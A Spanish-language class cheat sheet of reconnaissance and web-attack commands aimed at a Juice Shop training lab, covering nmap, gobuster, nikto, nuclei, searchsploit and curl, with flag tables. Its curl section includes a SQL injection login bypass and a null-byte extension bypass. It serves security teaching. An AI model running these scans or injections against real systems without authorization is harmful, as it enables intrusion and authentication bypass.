# Comandos usados en Clase 2 — Módulo 1

Referencia rápida de los comandos ejecutados durante la clase con explicación de flags.

---

## Nmap — Escaneo de puertos y detección de servicios

```bash
# Scan básico de puertos web con detección de versión
nmap -sV -p 80,443 juice.labs.manuel-roldan.cloud

# Con scripts default (-sC) para enumerar info adicional
nmap -sV -sC -p 80,443 juice.labs.manuel-roldan.cloud

# Scripts de vulnerabilidades HTTP
nmap -sV --script=http-enum,http-headers,http-methods -p 443 juice.labs.manuel-roldan.cloud

# Scripts por categoría (discovery, vuln, safe)
nmap --script="discovery and safe" -p 443 juice.labs.manuel-roldan.cloud

# Script personalizado (NSE local)
nmap -Pn -p 443 --script Modulo-1/lab/nmap/scripts/http-security-headers-simple.nse juice.labs.manuel-roldan.cloud
```

| Flag | Descripción |
|------|-------------|
| `-sV` | Detecta versión del servicio |
| `-sC` | Ejecuta scripts NSE por defecto (equivale a `--script=default`) |
| `-Pn` | No hace ping previo (asume que el host está activo) |
| `-p` | Puertos a escanear (`80,443` específicos, `-p-` todos) |
| `--script` | Ejecuta scripts NSE por nombre, glob (`http-*`) o categoría (`vuln`) |

**Categorías de scripts NSE:**

| Categoría | Qué hace |
|-----------|----------|
| `discovery` | Enumerar información (headers, robots, paths) |
| `vuln` | Buscar vulnerabilidades conocidas |
| `safe` | Scripts que no dañan el target |
| `intrusive` | Más agresivos (pueden afectar el servicio) |
| `auth` | Autenticación (brute-force, credenciales por defecto) |

**Ubicación de scripts NSE:** `/usr/share/nmap/scripts/`

```bash
# Listar scripts HTTP
ls /usr/share/nmap/scripts/http-*

# Listar scripts de categoría safe
grep -l '"safe"' /usr/share/nmap/scripts/*.nse
```

---

## Gobuster — Fuerza bruta de directorios

```bash
# Escaneo básico de directorios
gobuster dir -u https://juice.labs.manuel-roldan.cloud \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -k

# Con más hilos para mayor velocidad
gobuster dir -u https://juice.labs.manuel-roldan.cloud \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -t 50

# Excluir códigos de error (sin wildcards, listar explícitamente)
gobuster dir -u https://juice.labs.manuel-roldan.cloud \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -b 500,501,502,503,504

# Solo mostrar ciertos códigos de respuesta
gobuster dir -u https://juice.labs.manuel-roldan.cloud \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -s 200,301,302,403
```

| Flag | Descripción |
|------|-------------|
| `dir` | Modo directory brute-force |
| `-u` | URL objetivo |
| `-w` | Wordlist (diccionario) |
| `-k` | Ignora errores de certificado SSL |
| `-t` | Hilos concurrentes (default: 10) |
| `-b` | Blacklist de códigos HTTP (ocultar del output) |
| `-s` | Whitelist de códigos HTTP (solo mostrar estos) |

---

## Nikto — Escaneo de vulnerabilidades web

```bash
# Escaneo básico
nikto -h https://juice.labs.manuel-roldan.cloud

# Sin interacción (ignora warnings)
nikto -h https://juice.labs.manuel-roldan.cloud -nointeractive

# Actualizar base de datos de vulnerabilidades
sudo nikto -update
```

| Flag | Descripción |
|------|-------------|
| `-h` | Host objetivo (acepta URL completa) |
| `-nointeractive` | No pide confirmación del usuario |
| `-update` | Actualiza plugins y base de datos |

---

## Nuclei — Escaneo de vulnerabilidades con templates

```bash
# Escaneo completo (todos los templates)
nuclei -u https://juice.labs.manuel-roldan.cloud

# Solo severidad alta y crítica
nuclei -u https://juice.labs.manuel-roldan.cloud -s high,critical

# Guardar resultados
nuclei -u https://juice.labs.manuel-roldan.cloud -o juice-results.txt
```

| Flag | Descripción |
|------|-------------|
| `-u` | URL objetivo |
| `-s` | Filtrar por severidad (info, low, medium, high, critical) |
| `-t` | Templates específicos |
| `-c` | Concurrencia (default: 25) |
| `-o` | Output a archivo |

---

## Searchsploit — Búsqueda de exploits conocidos

```bash
# Buscar exploits por tecnología detectada
searchsploit node-serialize
searchsploit Express
searchsploit Traefik

# Ver contenido de un exploit
searchsploit -x nodejs/webapps/49552.py
```

| Flag | Descripción |
|------|-------------|
| `-x` | Examinar (ver) el contenido del exploit |
| `-m` | Copiar exploit al directorio actual |
| `-p` | Mostrar path completo del exploit |

---

## Curl — Análisis manual de respuestas

```bash
# Headers de respuesta
curl -sI https://juice.labs.manuel-roldan.cloud

# Provocar error para obtener information disclosure
curl -s https://juice.labs.manuel-roldan.cloud/api/version

# Extraer rutas de la API desde el JavaScript del frontend
curl -s https://juice.labs.manuel-roldan.cloud/main.js | grep -oP '"/api/[^"]+"|"/rest/[^"]+"' | sort -u

# Null Byte Injection para bypass de extensión
curl -s "https://juice.labs.manuel-roldan.cloud/ftp/package.json.bak%2500.md"

# SQLi en login
curl -X POST https://juice.labs.manuel-roldan.cloud/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}'
```

---

## SecLists — Ubicación de diccionarios

Instalación: `sudo apt install seclists`

Ubicación: `/usr/share/seclists/`

| Ruta | Uso |
|------|-----|
| `Discovery/Web-Content/common.txt` | Directory brute-force (general) |
| `Discovery/Web-Content/directory-list-2.3-medium.txt` | Directory brute-force (extenso) |
| `Passwords/Common-Credentials/best1050.txt` | Passwords comunes (ideal CTF) |
| `Fuzzing/SQLi/Generic-SQLi.txt` | Payloads de SQL Injection |
| `Fuzzing/XSS/XSS-Jhaddix.txt` | Payloads de XSS |
| `Discovery/DNS/subdomains-top1million-5000.txt` | Enumeración de subdominios |

---

## Notas

- Todos los comandos activos requieren autorización del dueño del target.
- `searchsploit` es un punto de partida: siempre validar si el exploit aplica al target real.
- Nmap no acepta URLs (`https://`), solo hostnames o IPs.
- `-k` en curl y gobuster ignora errores de certificado SSL (mismo propósito).
- El flag `-b` de gobuster no soporta wildcards — listar códigos explícitamente separados por coma.
